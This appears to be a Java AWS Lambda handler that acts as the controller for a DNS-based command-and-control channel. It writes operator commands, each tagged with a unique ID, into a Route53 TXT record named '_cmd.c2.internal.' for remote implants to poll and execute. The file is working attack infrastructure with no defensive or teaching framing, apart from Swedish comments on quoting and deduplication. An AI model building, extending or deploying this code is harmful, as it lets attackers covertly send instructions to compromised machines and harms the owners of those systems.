package org.linx;

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import software.amazon.awssdk.services.route53.Route53Client;
import software.amazon.awssdk.services.route53.model.*;

import java.util.Map;
import java.util.UUID;

public class ControlHandler implements RequestHandler<Map<String, Object>, String> {

    public final Route53Client r53 = Route53Client.create();

    @Override
    public String handleRequest(Map<String, Object> event, Context context) {
        final String zoneId     = System.getenv("ZONE_ID");
        final String recordName = "_cmd.c2.internal.";
        final long ttl          = Long.parseLong(System.getenv().getOrDefault("TTL", "5"));

        Object cmdObj = event == null ? null : event.get("command");
        if (cmdObj == null) throw new IllegalArgumentException("Missing 'command' in payload");
        final String command = cmdObj.toString();

        // TXT värden måste vara inom citationstecken,
        // uuid för att undvika att samma kommando körs flera gånger
        // delimeter :: borde inte förekomma i kommandot
        String id = UUID.randomUUID().toString();
        String safeCommand = command.replace("\"", "\\\"");
        String payload = id + "::" + safeCommand;
        String txtValue = "\"" + payload + "\"";

        ResourceRecordSet rrset = ResourceRecordSet.builder()
                .name(recordName)
                .type(RRType.TXT)
                .ttl(ttl)
                .resourceRecords(ResourceRecord.builder().value(txtValue).build())
                .build();

        ChangeBatch batch = ChangeBatch.builder()
                .changes(Change.builder().action(ChangeAction.UPSERT).resourceRecordSet(rrset).build())
                .build();

        ChangeResourceRecordSetsResponse resp =
                r53.changeResourceRecordSets(b -> b.hostedZoneId(zoneId).changeBatch(batch));

        return resp.changeInfo().id();
    }
}
